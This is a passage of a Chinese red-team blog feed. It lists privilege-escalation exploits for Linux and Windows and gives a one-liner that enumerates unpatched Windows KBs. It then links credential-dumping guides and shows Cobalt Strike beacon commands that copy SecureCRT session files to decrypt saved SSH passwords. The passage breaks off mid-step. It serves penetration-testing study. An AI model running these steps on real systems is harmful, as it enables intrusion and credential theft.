class="hljs-string">-0077</span> [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)</code></pre><p><strong>已对外公开 exp 注：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>linux-kernel-exploitshttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Kabot/</span>Unix-Privilege-Escalation-Exploits-Pack/https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/xairy/</span>kernel-exploits</code></pre><hr><h4 id="6-1-1-2-Sudo漏洞分析-CVE-2019-14287"><a href="#6-1-1-2-Sudo漏洞分析-CVE-2019-14287" class="headerlink" title="6.1.1.2 Sudo漏洞分析 (CVE-2019-14287)"></a>6.1.1.2 Sudo漏洞分析 (CVE-2019-14287)</h4><pre><code class="hljs gradle">sudo -V | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;Sudo version&#x27;</span></code></pre><p>即可查看是否受到该版本（低于1.8.29）的影响</p><p>参考</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.sudo.ws<span class="hljs-regexp">/alerts/mi</span>nus_1_uid.htmlhttps:<span class="hljs-regexp">//</span>www.sudo.ws<span class="hljs-regexp">/sudo/m</span>an<span class="hljs-regexp">/1.8.2/</span>sudoers.man.htmlhttps:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">217089</span>.html</code></pre><hr><h4 id="6-1-1-3-Linux提权之内核提权"><a href="#6-1-1-3-Linux提权之内核提权" class="headerlink" title="6.1.1.3 Linux提权之内核提权"></a>6.1.1.3 Linux提权之内核提权</h4><pre><code class="hljs applescript">anquanke.com/post/<span class="hljs-built_in">id</span>/<span class="hljs-number">98628</span>  <span class="hljs-comment">---详解Linux权限提升的攻击与防护</span></code></pre><p>这两篇文章写得非常好，仔细看完就懂了…</p><hr><h3 id="6-1-2-Windows"><a href="#6-1-2-Windows" class="headerlink" title="6.1.2 Windows"></a>6.1.2 Windows</h3><h4 id="6-1-2-1-windows提权-快速查找exp"><a href="#6-1-2-1-windows提权-快速查找exp" class="headerlink" title="6.1.2.1 windows提权-快速查找exp"></a>6.1.2.1 windows提权-快速查找exp</h4><p>微软官方时刻关注列表网址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>technet.microsoft.com<span class="hljs-regexp">/zh-cn/</span>library<span class="hljs-regexp">/security/</span>dn639106.aspx</code></pre><p>地址更新为：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>security-updates<span class="hljs-regexp">/securitybulletins/</span><span class="hljs-number">2017</span>/securitybulletins2017</code></pre><p>比如常用的几个已公布的 exp：</p><pre><code class="hljs dns">KB<span class="hljs-number">2592799</span>KB<span class="hljs-number">3000061</span>KB<span class="hljs-number">2592799</span>...</code></pre><p>快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p><pre><code class="hljs less"><span class="hljs-selector-tag">systeminfo</span>&gt;<span class="hljs-selector-tag">micropoor</span><span class="hljs-selector-class">.txt</span><span class="hljs-selector-tag">&amp;</span>(for %i in ( KB977165 KB2160329 KB2503665 KB2592799KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904KB3134228 KB3143141 KB3141780 ) do <span class="hljs-variable">@type</span> micropoor.txt|<span class="hljs-variable">@find</span> /i<span class="hljs-string">&quot;%i&quot;</span>|| <span class="hljs-variable">@echo</span> %i you can fuck)<span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">del</span> /<span class="hljs-selector-tag">f</span> /<span class="hljs-selector-tag">q</span> /<span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">micropoor</span><span class="hljs-selector-class">.txt</span></code></pre><p>注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删</p><p><strong>exp注：</strong></p><pre><code class="hljs gradle">MS17-<span class="hljs-number">017</span> [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>)CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">8464</span> [LNK Remote Code Execution Vulnerability] (windows <span class="hljs-number">10</span><span class="hljs-regexp">/8.1/</span><span class="hljs-number">7</span><span class="hljs-regexp">/2016/</span><span class="hljs-number">2010</span>/<span class="hljs-number">2008</span>）CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">0213</span> [Windows COM Elevation of Privilege Vulnerability] (windows <span class="hljs-number">10</span><span class="hljs-regexp">/8.1/</span><span class="hljs-number">7</span><span class="hljs-regexp">/2016/</span><span class="hljs-number">2010</span>/<span class="hljs-number">2008</span>)MS17-<span class="hljs-number">010</span> [KB4013389] [Windows Kernel Mode Drivers](windows <span class="hljs-number">7</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2003</span>/XP)MS16-<span class="hljs-number">135</span> [KB3199135] [Windows Kernel Mode Drivers] (<span class="hljs-number">2016</span>)MS16-<span class="hljs-number">111</span> [KB3186973] [kernel api] (Windows <span class="hljs-number">10</span> <span class="hljs-number">10586</span> (<span class="hljs-number">32</span><span class="hljs-regexp">/64)/</span><span class="hljs-number">8.1</span>)MS16-<span class="hljs-number">098</span> [KB3178466] [Kernel Driver] (Win <span class="hljs-number">8.1</span>)MS16-<span class="hljs-number">075</span> [KB3164038] [Hot Potato] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS16-<span class="hljs-number">034</span> [KB3143145] [Kernel Driver] (<span class="hljs-number">2008</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span><span class="hljs-regexp">/10/</span><span class="hljs-number">2012</span>)MS16-<span class="hljs-number">032</span> [KB3143141] [Secondary Logon Handle] (<span class="hljs-number">2008</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span><span class="hljs-regexp">/10/</span><span class="hljs-number">2012</span>)MS16-<span class="hljs-number">016</span> [KB3136041] [WebDAV] (<span class="hljs-number">2008</span><span class="hljs-regexp">/Vista/</span><span class="hljs-number">7</span>)MS15-<span class="hljs-number">097</span> [KB3089656] [remote code execution] (win8.<span class="hljs-number">1</span>/<span class="hljs-number">2012</span>)MS15-<span class="hljs-number">076</span> [KB3067505] [RPC] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS15-<span class="hljs-number">077</span> [KB3077657] [ATM] (XP<span class="hljs-regexp">/Vista/</span>Win7<span class="hljs-regexp">/Win8/</span><span class="hljs-number">2000</span><span class="hljs-regexp">/2003/</span><span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>)MS15-<span class="hljs-number">061</span> [KB3057839] [Kernel Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS15-<span class="hljs-number">051</span> [KB3057191] [Windows Kernel Mode Drivers] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS15-<span class="hljs-number">010</span> [KB3036220] [Kernel Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/<span class="hljs-number">8</span>)MS15-<span class="hljs-number">015</span> [KB3031432] [Kernel Driver] (Win7<span class="hljs-regexp">/8/</span><span class="hljs-number">8.1</span><span class="hljs-regexp">/2012/</span>RT<span class="hljs-regexp">/2012 R2/</span><span class="hljs-number">2008</span> R2)MS15-<span class="hljs-number">001</span> [KB3023266] [Kernel Driver] (<span class="hljs-number">2008</span><span class="hljs-regexp">/2012/</span><span class="hljs-number">7</span>/<span class="hljs-number">8</span>)MS14-<span class="hljs-number">070</span> [KB2989935] [Kernel Driver] (<span class="hljs-number">2003</span>)MS14-<span class="hljs-number">068</span> [KB3011780] [Domain Privilege Escalation] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span>)MS14-<span class="hljs-number">058</span> [KB3000061] [Win32k.sys] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span>)MS14-<span class="hljs-number">040</span> [KB2975684] [AFD Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span>)MS14-<span class="hljs-number">002</span> [KB2914368] [NDProxy] (<span class="hljs-number">2003</span>/XP)MS13-<span class="hljs-number">053</span> [KB2850851] [win32k.sys] (XP<span class="hljs-regexp">/Vista/</span><span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span>win <span class="hljs-number">7</span>)MS13-<span class="hljs-number">046</span> [KB2840221] [dxgkrnl.sys] (Vista<span class="hljs-regexp">/2003/</span><span class="hljs-number">2008</span><span class="hljs-regexp">/2012/</span><span class="hljs-number">7</span>)MS13-<span class="hljs-number">005</span> [KB2778930] [Kernel Mode Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/win7/</span><span class="hljs-number">8</span>)MS12-<span class="hljs-number">042</span> [KB2972621] [Service Bus] (<span class="hljs-number">2008</span><span class="hljs-regexp">/2012/</span>win7)MS12-<span class="hljs-number">020</span> [KB2671387] [RDP] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/XP)MS11-<span class="hljs-number">080</span> [KB2592799] [AFD.sys] (<span class="hljs-number">2003</span>/XP)MS11-<span class="hljs-number">062</span> [KB2566454] [NDISTAPI] (<span class="hljs-number">2003</span>/XP)MS11-<span class="hljs-number">046</span> [KB2503665] [AFD.sys] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/XP)MS11-<span class="hljs-number">011</span> [KB2393802] [kernel Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/XP/</span>Vista)MS10-<span class="hljs-number">092</span> [KB2305420] [<span class="hljs-keyword">Task</span> Scheduler] (<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>)MS10-<span class="hljs-number">065</span> [KB2267960] [FastCGI] (IIS <span class="hljs-number">5.1</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">7.0</span>, and <span class="hljs-number">7.5</span>)MS10-<span class="hljs-number">059</span> [KB982799] [ACL-Churraskito] (<span class="hljs-number">2008</span><span class="hljs-regexp">/7/</span>Vista)MS10-<span class="hljs-number">048</span> [KB2160329] [win32k.sys] (XP SP2 &amp; SP3<span class="hljs-regexp">/2003 SP2/</span>Vista SP1 &amp; SP2<span class="hljs-regexp">/2008 Gold &amp; SP2 &amp; R2/</span>Win7)MS10-<span class="hljs-number">015</span> [KB977165] [KiTrap0D] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/XP)MS10-<span class="hljs-number">012</span> [KB971468] [SMB Client Trans2 stack overflow] (Windows <span class="hljs-number">7</span>/<span class="hljs-number">2008</span>R2)MS09-<span class="hljs-number">050</span> [KB975517][Remote Code Execution] (<span class="hljs-number">2008</span>/Vista)MS09-<span class="hljs-number">020</span> [KB970483] [IIS <span class="hljs-number">6.0</span>] (IIS <span class="hljs-number">5.1</span> and <span class="hljs-number">6.0</span>)MS09-<span class="hljs-number">012</span> [KB959454] [Chimichurri] (Vista<span class="hljs-regexp">/win7/</span><span class="hljs-number">2008</span>/Vista)MS08-<span class="hljs-number">068</span> [KB957097] [Remote Code Execution] (<span class="hljs-number">2000</span>/XP)MS08-<span class="hljs-number">067</span> [KB958644] [Remote Code Execution] (Windows <span class="hljs-number">2000</span><span class="hljs-regexp">/XP/</span>Server <span class="hljs-number">2003</span><span class="hljs-regexp">/Vista/</span>Server <span class="hljs-number">2008</span>)MS08-<span class="hljs-number">066</span> [] [] (Windows <span class="hljs-number">2000</span><span class="hljs-regexp">/XP/</span>Server <span class="hljs-number">2003</span>)MS08-<span class="hljs-number">025</span> [KB941693] [Win32.sys] (XP<span class="hljs-regexp">/2003/</span><span class="hljs-number">2008</span>/Vista)MS06-<span class="hljs-number">040</span> [KB921883] [Remote Code Execution] (<span class="hljs-number">2003</span><span class="hljs-regexp">/xp/</span><span class="hljs-number">2000</span>)MS05-<span class="hljs-number">039</span> [KB899588] [PnP Service] (Win <span class="hljs-number">9</span>X<span class="hljs-regexp">/ME/</span>NT<span class="hljs-regexp">/2000/</span>XP/<span class="hljs-number">2003</span>)MS03-<span class="hljs-number">026</span> [KB823980] [Buffer Overrun In RPC <span class="hljs-keyword">Interface</span>] (<span class="hljs-regexp">/NT/</span><span class="hljs-number">2000</span><span class="hljs-regexp">/XP/</span><span class="hljs-number">2003</span>)</code></pre><p><strong>已对外公开exp注：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>windows-kernel-exploitshttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/WindowsExploits/</span>Exploitshttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AusJock/</span>Privilege-Escalation</code></pre><hr><h4 id="6-1-2-2-Token窃取与利用"><a href="#6-1-2-2-Token窃取与利用" class="headerlink" title="6.1.2.2 Token窃取与利用"></a>6.1.2.2 Token窃取与利用</h4><pre><code class="hljs asciidoc">https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Token窃取与利用/https://www.xianfish.xyz/2020/01/04/Token窃取与利用/<span class="hljs-link">https://edu.heibai.org/Micro8-渗透沉思录/第一百一十课：窃取,伪造模拟各种windows访问令牌</span>[<span class="hljs-string">token利用</span>].pdf<span class="hljs-link">https://gogs.coooool.club/jee/MICRO/src/573628d1dd817622347dfab242af55bdebfd586b/第一百一十课：窃取,伪造模拟各种windows访问令牌</span>[<span class="hljs-string">token利用</span>].pdf</code></pre><p>看完这四个文章，在复现下期中的一些原理，就摸透了Token窃取与利用！！！</p><hr><h4 id="6-1-2-3-CVE2019-1388-Windows-UAC-提权漏洞"><a href="#6-1-2-3-CVE2019-1388-Windows-UAC-提权漏洞" class="headerlink" title="6.1.2.3 CVE2019-1388 Windows UAC 提权漏洞"></a>6.1.2.3 CVE2019-1388 Windows UAC 提权漏洞</h4><p><strong>参考链接：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ajsafe.com<span class="hljs-regexp">/news/</span><span class="hljs-number">58</span>.htmlhttp:<span class="hljs-regexp">//</span>blog.leanote.com<span class="hljs-regexp">/post/</span>snowming/<span class="hljs-number">38069</span>f423c76https:<span class="hljs-regexp">//</span>portal.msrc.microsoft.com<span class="hljs-regexp">/en-US/</span>security-guidance<span class="hljs-regexp">/advisory/</span>CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">1388</span></code></pre><hr><h4 id="6-1-3-第三方组件提权"><a href="#6-1-3-第三方组件提权" class="headerlink" title="6.1.3 第三方组件提权"></a>6.1.3 第三方组件提权</h4><p>权限提升参考总文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.secpulse.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">138197</span>.html</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;六、权限提升&quot;&gt;&lt;a href=&quot;#六、权限提升&quot; class=&quot;headerlink&quot; title=&quot;六、权限提升&quot;&gt;&lt;/a&gt;六、权限提升&lt;/h1&gt;&lt;h2 id=&quot;6-1-操作系统提权&quot;&gt;&lt;a href=&quot;#6-1-操作系统提权&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之内部信息收集</title>
    <link href="http://www.secice.cn/p/56572a0f"/>
    <id>http://www.secice.cn/p/56572a0f</id>
    <published>2020-12-23T19:52:15.000Z</published>
    <updated>2020-12-28T09:46:50.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="五、内部信息收集"><a href="#五、内部信息收集" class="headerlink" title="五、内部信息收集"></a>五、内部信息收集</h1><h2 id="1、本地信息搜集"><a href="#1、本地信息搜集" class="headerlink" title="1、本地信息搜集"></a>1、本地信息搜集</h2><h3 id="1-1、用普通权限的域帐户获得域环境中所有DNS解析记录"><a href="#1-1、用普通权限的域帐户获得域环境中所有DNS解析记录" class="headerlink" title="1.1、用普通权限的域帐户获得域环境中所有DNS解析记录"></a>1.1、用普通权限的域帐户获得域环境中所有DNS解析记录</h3><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>beta.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/web/</span><span class="hljs-number">17955</span>.html  --原文https:<span class="hljs-regexp">//</span>nosec.org<span class="hljs-regexp">/home/</span>detail/<span class="hljs-number">2527</span>.html</code></pre><hr><h3 id="1-2、令牌Token和会话Session原理与攻略"><a href="#1-2、令牌Token和会话Session原理与攻略" class="headerlink" title="1.2、令牌Token和会话Session原理与攻略"></a>1.2、令牌Token和会话Session原理与攻略</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/huangsheng/</span>p/<span class="hljs-number">10736796</span>.html</code></pre><h3 id="1-3、内存转储-获取本地hash"><a href="#1-3、内存转储-获取本地hash" class="headerlink" title="1.3、内存转储-获取本地hash"></a>1.3、内存转储-获取本地hash</h3><p>参考文章：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.secwk.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">09</span><span class="hljs-regexp">/08/</span><span class="hljs-number">6372</span>/</code></pre><hr><h3 id="1-4、转储域账户哈希值"><a href="#1-4、转储域账户哈希值" class="headerlink" title="1.4、转储域账户哈希值"></a>1.4、转储域账户哈希值</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>scarletf.github.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">09</span><span class="hljs-regexp">/03/</span>域渗透-导出域用户Hash方法/https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2527</span>   ---如何Dump域内的Hashhttps:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1165439</span>   --导出域内用户hash的几种方法</code></pre><p>这几种方法，结合下思想<br>然后书中的两个续集思路…</p><hr><h3 id="1-5、SPN发现与利用"><a href="#1-5、SPN发现与利用" class="headerlink" title="1.5、SPN发现与利用"></a>1.5、SPN发现与利用</h3><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://sec.thief.one/article_content?a_id=<span class="hljs-number">594539</span>e<span class="hljs-number">5</span>b<span class="hljs-number">195</span>b<span class="hljs-number">5</span>fc<span class="hljs-number">38051</span>bf<span class="hljs-number">7</span>fb<span class="hljs-number">438524</span>   --详细文章</code></pre><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>rcoil.me<span class="hljs-regexp">/2019/</span><span class="hljs-number">06</span><span class="hljs-regexp">/【域渗透】SPN%20扫描利用/</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">174229</span>.html   --老文章  SPN服务主体名称发现详解</code></pre><p>想要继续了解的可以查看这两篇文章，巩固下</p><hr><h3 id="1-6哈希传递攻击利用"><a href="#1-6哈希传递攻击利用" class="headerlink" title="1.6哈希传递攻击利用"></a>1.6哈希传递攻击利用</h3><p>参考文献：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>saucer-man.com<span class="hljs-regexp">/information_security/</span><span class="hljs-number">443</span>.html<span class="hljs-comment">#cl-11</span>https:<span class="hljs-regexp">//</span>saucer-man.com<span class="hljs-regexp">/information_security/</span><span class="hljs-number">79</span>.html<span class="hljs-comment">#cl-13</span>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">217681</span>.htmlhttps:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_36119192/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">104802921</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Mikasa-Ackerman/</span>p/hou-shen-tou-zhong-de-mi-ma-zhua-qu.html</code></pre><hr><h2 id="2、用户习惯"><a href="#2、用户习惯" class="headerlink" title="2、用户习惯"></a>2、用户习惯</h2><h3 id="2-1-从目标文件中做信息搜集第一季"><a href="#2-1-从目标文件中做信息搜集第一季" class="headerlink" title="2.1 从目标文件中做信息搜集第一季"></a>2.1 从目标文件中做信息搜集第一季</h3><p>ExifTool可读写及处理图像、视频及音频，例如Exif、IPTC、XMP、JFIF、GeoTIFF、ICC Profile。包括许多相机的制造商信息读取，如佳能，卡西欧，大疆，FLIR，三星等<br><code>exiftool -lang zh-cn -a -u -g1 ./sample.php.png </code></p><p>在大型内网渗透中，尤其是针对办公机的渗透，需要熟知目标集体或者个人的作息时间，工作时间，文档时间，咖啡时间，或者需要从某些文件中获取对方的真实拍摄地坐标等。那么无疑需要快速的从大量文件中筛选信息诉求。当目标越复杂，文件中的信息搜集就更为重要。如文档作者，技术文章作者，财务文档作者等，熟知在大量人员，获取对方职务，大大减少渗透过程中的无用性，重复性，可见性。与暴露性。而作为公司，应该熟悉相关文档的内置属性，尤其是在共享文件服务器上，删除或者复写敏感信息来降低企业安全风险。</p><p>本篇意旨企业安全在处理本公司相关敏感文件以及重要文件应做好更多的防范，尤其是重要部门，如研发，财务等。</p><hr><h3 id="2-2、获取当前系统所有用户的谷歌浏览器密码"><a href="#2-2、获取当前系统所有用户的谷歌浏览器密码" class="headerlink" title="2.2、获取当前系统所有用户的谷歌浏览器密码"></a>2.2、获取当前系统所有用户的谷歌浏览器密码</h3><p>参考文章：</p><ul><li><a href="https://cloud.tencent.com/developer/article/1512066">https://cloud.tencent.com/developer/article/1512066</a></li></ul><hr><h3 id="2-3、adsutil-vbs-获取密码"><a href="#2-3、adsutil-vbs-获取密码" class="headerlink" title="2.3、adsutil.vbs 获取密码"></a>2.3、adsutil.vbs 获取密码</h3><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.<span class="hljs-number">5</span>dmail.net<span class="hljs-regexp">/html/</span><span class="hljs-number">2007</span>-<span class="hljs-number">5</span>-<span class="hljs-number">9</span>/<span class="hljs-number">20075901045</span>.htmhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/94YY/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">05</span><span class="hljs-regexp">/28/</span><span class="hljs-number">2060887</span>.html</code></pre><p>这很老的知识点，当做一种思路吧…</p><hr><h3 id="2-4、解密目标机器保存的rdp凭证"><a href="#2-4、解密目标机器保存的rdp凭证" class="headerlink" title="2.4、解密目标机器保存的rdp凭证"></a>2.4、解密目标机器保存的rdp凭证</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">6</span>c11412947e5    --mimikatz获取https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/y</span>J4z    ---lsass获取https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/0xdd/</span>p/<span class="hljs-number">11394566</span>.html</code></pre><p>这个方法很简单，看看就记住了…</p><hr><h3 id="2-5、Hashcat-神器详解"><a href="#2-5、Hashcat-神器详解" class="headerlink" title="2.5、Hashcat 神器详解"></a>2.5、Hashcat 神器详解</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4008</span>   --详细https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/smli_ng/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106111493</span></code></pre><p>这里遇到了就来查…</p><h4 id="字典集合分享"><a href="#字典集合分享" class="headerlink" title="字典集合分享"></a><strong>字典集合分享</strong></h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm https:<span class="hljs-regexp">//</span>weakpass.com/download http:<span class="hljs-regexp">//</span>ophcrack.sourceforge.net/tables.php https:<span class="hljs-regexp">/github.com/</span>fuzzdb-project/fuzzdb https:<span class="hljs-regexp">//</span>wiki.skullsecurity.org/passwords<span class="hljs-comment">#Password_dictionaries</span></code></pre><p>战略支援部近期会对网络上的字典进行下载整理汇总,形成较完整的字典表…拿走</p><h4 id="其他暴力破解软件"><a href="#其他暴力破解软件" class="headerlink" title="其他暴力破解软件"></a><strong>其他暴力破解软件</strong></h4><pre><code class="hljs ada">Aircrack-ng-WIFI破解工具 John The Ripper<span class="hljs-comment">--功能强大的破解工具包 </span>Medusa<span class="hljs-comment">--在线破解工具 </span>Ophcrack<span class="hljs-comment">--LM-Hash破解神器 </span>THC Hydra<span class="hljs-comment">--在线破解工具 </span>WFUZZ<span class="hljs-comment">--WebFuzz神器</span></code></pre><h4 id="在线解Hash网站"><a href="#在线解Hash网站" class="headerlink" title="在线解Hash网站"></a><strong>在线解Hash网站</strong></h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cmd5.com/ https:<span class="hljs-regexp">//</span>crackstation.net/https:<span class="hljs-regexp">//</span>www.onlinehashcrack.com/ tps:<span class="hljs-regexp">/www.objectif-securite.ch/</span>ophcrack.php https:<span class="hljs-regexp">//</span>hce.iteknical.com/</code></pre><hr><h3 id="2-6、解密Winscp和SecureCRT客户端中保存的密码hash"><a href="#2-6、解密Winscp和SecureCRT客户端中保存的密码hash" class="headerlink" title="2.6、解密Winscp和SecureCRT客户端中保存的密码hash"></a>2.6、解密Winscp和SecureCRT客户端中保存的密码hash</h3><h4 id="Winscp"><a href="#Winscp" class="headerlink" title="Winscp"></a>Winscp</h4><p>到时候补充吧</p><h4 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h4><p><strong>前言</strong></p><p>SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。</p><p>所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用结尾处的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了<br><strong>确定目标SecureCRT的详细版本</strong></p><p>想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）</p><pre><code class="hljs gradle">beacon&gt; powershell-<span class="hljs-keyword">import</span> <span class="hljs-regexp">/Users/</span>anonysec/ListInstalledPrograms.ps1beacon&gt; powershell Get-list</code></pre><p><strong>确定SecureCRT配置文件目录下的Sessions目录</strong></p><p>默认情况下，SecureCRT的Config目录路径为：%APPDATA%\VanDyke\Config\Sessions\</p><p>如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认<br>Sessions目录下的每个ini文件都会以连接的IP或域名来命名</p><pre><code class="hljs taggerscript">beacon&gt;shell dir <span class="hljs-variable">%APPDATA%</span><span class="hljs-symbol">\V</span>anDyke<span class="hljs-symbol">\C</span>onfig<span class="hljs-symbol">\S</span>essions\</code></pre><p><strong>拷贝下载Sessions目录的ini文件</strong></p><p>直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。</p><pre><code class="hljs taggerscript">beacon&gt; powershell-import /Users/anonysec/Invoke-NinjaCopy.ps1beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\r</span>00t<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\V</span>anDyke<span class="hljs-symbol">\C</span>onfig<span class="hljs-symbol">\S</span>essions<span class="hljs-symbol">\1</span>92.168.144.128.ini&quot; -LocalDestination &quot;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini&quot;beacon&gt; shell dir c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini beacon&gt; download c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\1</span>92.168.144.128.ini</code></pre><p><strong>脚本解密Session</strong></p><p>将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 